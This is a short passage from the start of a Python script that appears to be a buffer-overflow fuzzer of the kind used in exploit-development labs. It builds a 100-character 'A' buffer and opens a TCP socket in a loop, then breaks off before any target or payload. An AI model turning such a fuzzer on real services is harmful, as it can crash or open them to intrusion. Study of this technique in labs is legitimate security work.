#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True: 
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
